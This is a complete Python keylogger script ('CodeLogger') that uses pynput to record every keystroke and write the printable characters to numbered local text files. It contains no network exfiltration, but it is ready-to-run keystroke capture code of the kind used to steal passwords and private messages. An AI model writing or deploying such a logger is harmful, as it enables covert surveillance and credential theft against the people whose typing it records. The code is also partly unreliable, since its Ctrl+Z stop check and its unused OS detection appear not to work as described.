# Importing necessary modules
import os, platform, sys
import time
from pynput.keyboard import Key, Controller, Listener, KeyCode

# Initializing variables
keys = []
count = 0
file_name = "key.txt"

# Checking if file exists
while os.path.isfile(file_name):
    count += 1
    file_name = f"key{count}.txt"

# Function to write to file
def write_to_file(key):
    global keys, count

    keys.append(key)
    if len(keys) >= 10:
        with open(file_name, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                # If the key is a space, write a newline character to the file
                if k.find("space") > 0:
                    f.write("\n")
                # If the key is not a special key, write it to the file
                elif k.find("Key") == -1:
                    f.write(k)

            keys = []

# Function to check OS type
def check_os():
    # Check if the operating system is Windows or Linux
    if platform.system() == "Windows":
        return "win"
    else:
        return "lin"

# Function to check key press event
def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")

# Function to check key release event
def on_release(key):
    # If the 'Ctrl+Z' key combination is pressed, stop logging and exit the program
    if hasattr(key, 'vk') and key.vk == KeyCode.from_char('Z').vk and key.ctrl:
        sys.exit()

# Main function
def main():
    print("Starting CodeLogger....")
    print("Press 'Ctrl+Z' to stop logging...")

    # Checking OS type
    os_type = check_os()

    # Starting listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()